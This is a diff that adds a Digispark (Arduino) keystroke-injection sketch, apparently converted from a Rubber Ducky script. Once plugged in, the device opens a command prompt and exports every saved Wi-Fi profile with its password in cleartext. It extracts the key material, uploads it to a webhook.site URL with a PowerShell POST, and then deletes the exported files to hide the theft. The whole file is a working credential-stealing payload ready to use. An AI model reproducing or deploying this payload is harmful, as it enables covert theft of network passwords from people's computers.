@@ -1,0 +1,32 @@
+// Converted using digiQuack by CedArctic (https://github.com/CedArctic/digiQuack) 
+
+#include "DigiKeyboard.h"
+
+void setup(){
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.println("cmd");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.println("color A");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.println("cd %temp%");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.println("netsh wlan export profile key=clear");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.println("powershell select-String -Path Wi-Fi*.xml -Pattern 'KeyMaterial' > WiFi-Key");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/de8869ac-63b4-4605-acb3-98e7f9be5107 -Method POST -InFile WiFi-Key");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.println("del Wi* /s/f/q");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.println("exit");
+  DigiKeyboard.delay(400);
+  
+}
+
+void loop() {
+
+}
